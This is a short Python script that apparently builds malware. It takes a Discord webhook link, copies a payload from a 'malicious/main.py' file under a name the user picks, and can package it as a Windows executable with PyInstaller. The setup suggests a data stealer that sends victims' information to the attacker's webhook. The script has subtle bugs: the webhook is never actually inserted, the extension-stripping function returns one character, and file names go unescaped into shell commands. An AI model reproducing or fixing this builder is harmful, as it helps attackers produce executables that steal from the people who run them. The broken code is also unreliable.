
import subprocess
import os
import re
from tqdm import tqdm
def convertToExe(filename):
    cmd = f"pyinstaller {filename}.py --onefile --clean "
    print('Processing...')
    
    process = subprocess.Popen(cmd,  shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
        
            
    process.wait()
    return 


def removePy(filename):
    return filename[-3] if '.py' in filename else filename
def crFile(filename, link):
    code = f'''
DISCORD_WEBHOOK = {link}
    '''
    with open('malicious/main.py', 'r') as f:
        content = f.read()
    code.join(f'\n {content}')
    f.close()
    os.system(f'touch {filename}.py')
    with open(f'{filename}.py', 'w') as f:
        f.write(content)
        
def main():
    filename = input('File Name Here --> ')
    filename = removePy(filename)
    link = input('Insert webhook link: ')
    crFile(filename, link)
    ses = input('Convert to .exe? (y/n) --> ')
    if ses== 'y':
        convertToExe(filename)
        print('Successfully converted to exe!')
        
    else:
        print('Non executable file huh??')
if __name__ == '__main__':
    main()